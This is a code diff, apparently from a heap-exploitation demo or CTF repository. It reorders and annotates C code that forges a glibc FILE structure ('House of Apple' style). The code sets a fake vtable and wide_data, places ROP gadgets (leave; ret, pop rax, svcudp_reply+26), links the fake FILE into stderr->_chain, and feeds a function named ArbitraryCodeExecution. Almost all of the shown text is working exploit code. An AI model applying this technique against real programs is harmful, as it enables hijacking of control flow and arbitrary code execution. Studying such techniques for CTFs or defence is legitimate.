@@ -375,24 +375,29 @@ void payload2_sum_into_one() {
     apple_wide_data_vtable = malloc(0xe0);                          // apple_wide_data_vtable = malloc(0xe0);
     svcudp_reply_chuck = malloc(0x100);
 
-    *(u32*)(apple + 0x00) = 0 & 0xfffffff7 & 0xfffff7ff & 0xfffffffd;
-    *(u64*)(apple + 0x18) = 0;                                      // apple->file._wide_data->_IO_write_base = (void*)0;
-    *(u64*)(apple + 0x20) = 0;                                      // apple->file._IO_write_base = (void *)0;
-    *(u64*)(apple + 0x28) = 1;                                      // apple->file._IO_write_ptr = (void *)1;
-    *(u64*)(apple + 0x30) = 0;                                      // apple->file._wide_data->_IO_buf_base = (void*)0;
-    *(u64*)(apple + 0x48) = (u64)svcudp_reply_chuck;                // <svcudp_reply+26>: mov    0x48(%rdi),%rbp
-    *(u64*)(apple + 0x68) = (u64)svcudp_reply_26_gadget;            // (wint_t)_IO_WDOALLOCATE (fp)
-    *(u64*)(apple + 0xa0) = (u64)apple;                             // apple->file._wide_data = apple_wide_data;
+    /* _IO_flush_all_lockp -> _IO_OVERFLOW */
     *(u64*)(apple + 0xc0) = 0;                                      // apple->file._mode = 0;
+    *(u64*)(apple + 0x28) = 1;                                      // apple->file._IO_write_ptr = (void *)1;
+    *(u64*)(apple + 0x20) = 0;                                      // apple->file._IO_write_base = (void *)0;
     *(u64*)(apple + 0xd8) = (u64)_IO_wfile_jumps;                   // apple->vtable = _IO_wfile_jumps;
-    *(u64*)(apple + 0xe0) = (u64)apple;                             // apple->file._wide_data->_wide_vtable = (void*)apple_wide_data_vtable;
 
+    /* _IO_wfile_overflow -> _IO_wdoallocbuf */
+    *(u32*)(apple + 0x00) = 0 & 0xfffffff7 & 0xfffff7ff & 0xfffffffd;
+    *(u64*)(apple + 0xa0) = (u64)apple;                             // apple->file._wide_data = apple_wide_data;
+    *(u64*)(apple + 0x18) = 0;                                      // apple->file._wide_data->_IO_write_base = (void*)0;
+    
+    /* _IO_wdoallocbuf -> _IO_WDOALLOCATE (fp) */
+    *(u64*)(apple + 0x30) = 0;                                      // apple->file._wide_data->_IO_buf_base = (void*)0;
+    *(u64*)(apple + 0x68) = (u64)svcudp_reply_26_gadget;            // (wint_t)_IO_WDOALLOCATE (fp)
+    *(u64*)(apple + 0xe0) = (u64)apple;                             // apple->file._wide_data->_wide_vtable = (void*)apple_wide_data_vtable;
+    
+    // ROP ...
+    *(u64*)(apple + 0x48) = (u64)svcudp_reply_chuck;                // <svcudp_reply+26>: mov    0x48(%rdi),%rbp
     *(u64*)(svcudp_reply_chuck + 0x00) = (u64)leave_ret_gadget;
     *(u64*)(svcudp_reply_chuck + 0x08) = (u64)pop_rax_pop_rax_ret_gadget;
     *(u64*)(svcudp_reply_chuck + 0x10) = 0xdeadbeef;
     *(u64*)(svcudp_reply_chuck + 0x18) = (u64)(svcudp_reply_chuck -0x28 + 0x00);
     *(u64*)(svcudp_reply_chuck + 0x20) = 0xcafeabe;
-    // ROP ...
 
     // or 
     // *(u32*)(apple + 0x00) = 0 & 0xfffffff7 & 0xfffff7ff & 0xfffffffd;
@@ -414,7 +419,6 @@ void payload2_sum_into_one() {
     
     stderr->_chain = (void*)apple;
 }
-
 void ArbitraryCodeExecution() {
     payload2();
     trigger1();
